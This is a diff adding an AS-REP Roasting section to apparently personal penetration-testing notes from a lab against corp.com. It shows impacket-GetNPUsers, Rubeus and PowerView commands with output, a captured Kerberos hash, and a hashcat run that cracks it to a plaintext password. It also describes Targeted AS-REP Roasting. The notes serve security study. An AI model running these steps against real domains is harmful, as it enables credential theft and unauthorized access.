@@ -114,3 +114,100 @@ Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
 2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
 ```
 {% endcode %}
+
+## AS-REP Roasting
+
+### impacket-GetNPUsers
+
+```
+ impacket-GetNPUsers -dc-ip 192.168.194.70  -request -outputfile hashes.asreproast corp.com/pete  
+ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
+----  --------  --------------------------  --------------------------  --------
+dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
+```
+
+{% code title="Obtaining the correct mode for Hashcat" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ hashcat --help | grep -i "Kerberos"
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+```
+{% endcode %}
+
+### Rubeus
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\jeff> cd C:\Tools
+
+PS C:\Tools> .\Rubeus.exe asreproast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : corp.com
+
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : dave
+[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+[*] Using domain controller: DC1.corp.com (192.168.50.70)
+[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
+...
+```
+{% endcode %}
+
+To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing 14 without the -request and -outputfile options.
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools> Get-DomainUser -PreauthNotRequired                                                                                                                                                                                                                                                                                                                         logoncount            : 65535                                                                                           badpasswordtime       : 10/18/2022 8:05:18 PM                                                                           distinguishedname     : CN=dave,CN=Users,DC=corp,DC=com                                                                 objectclass           : {top, person, organizationalPerson, user}                                                       lastlogontimestamp    : 8/13/2024 11:33:28 PM                                                                           name                  : dave                                                                                            objectsid             : S-1-5-21-1987370270-658905905-1781884369-1103                                                   samaccountname        : dave                                                                                            codepage              : 0                                                                                               samaccounttype        : USER_OBJECT                                                                                     accountexpires        : NEVER                                                                                           countrycode           : 0                                                                                               whenchanged           : 8/14/2024 6:33:28 AM                                                                            instancetype          : 4                                                                                               usncreated            : 12778                                                                                           objectguid            : 83522edd-09ce-4bae-804d-3d83b931e1f3                                                            lastlogoff            : 12/31/1600 4:00:00 PM                                                                           objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com                                             dscorepropagationdata : {9/2/2022 11:21:17 PM, 1/1/1601 12:00:00 AM}                                                    memberof              : CN=Development Department,DC=corp,DC=com                                                        lastlogon             : 8/13/2024 11:36:28 PM                                                                           badpwdcount           : 0                                                                                               cn                    : dave                                                                                            useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH                                          whencreated           : 9/2/2022 11:21:17 PM                                                                            primarygroupid        : 513                                                                                             pwdlastset            : 9/7/2022 9:54:57 AM                                                                             usnchanged            : 557209 
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+─(kali㉿kali)-[~/offsec]
+└─$ impacket-GetNPUsers -dc-ip 192.168.194.70 corp.com/pete
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
+----  ----------------------------------------  --------------------------  --------------------------  --------
+dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-08-14 02:48:28.482098  0x410200
+```
+{% endcode %}
+
+Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option Do not require Kerberos preauthentication enabled. While enumerating, we notice that we have GenericWrite or GenericAll permissions on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
+
+{% embed url="https://adsecurity.org/?p=3658" %}
+
+{% embed url="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/" %}
